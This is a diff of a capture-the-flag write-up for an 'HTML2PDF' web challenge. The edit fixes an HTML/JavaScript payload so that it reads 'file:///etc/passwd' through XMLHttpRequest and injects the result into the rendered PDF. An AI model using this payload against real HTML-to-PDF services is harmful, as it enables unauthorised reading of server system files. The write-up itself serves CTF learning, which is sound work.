@@ -81,6 +81,7 @@ so i loged in and got the flag : **utflag{w3bsock3ts}**
 
 ## 2- HTML2PDF
 <center><img src="../images/html2pdf_chall.png"></img></center>
+
 #### about : 
 - Type: Web 
 - Level: meduim 
@@ -93,7 +94,7 @@ so i need to get local file inclusion inside the html so it can return it after 
 ```html
 <h1 id='test2'>a</h1>
 <script>x = new XMLHttpRequest();
-x.open('GET','file:///etc/etc',false);
+x.open('GET','file:///etc/passwd',false);
 x.send();
 document.getElementById('test2').innerHTML= x.responseText;
 </script>
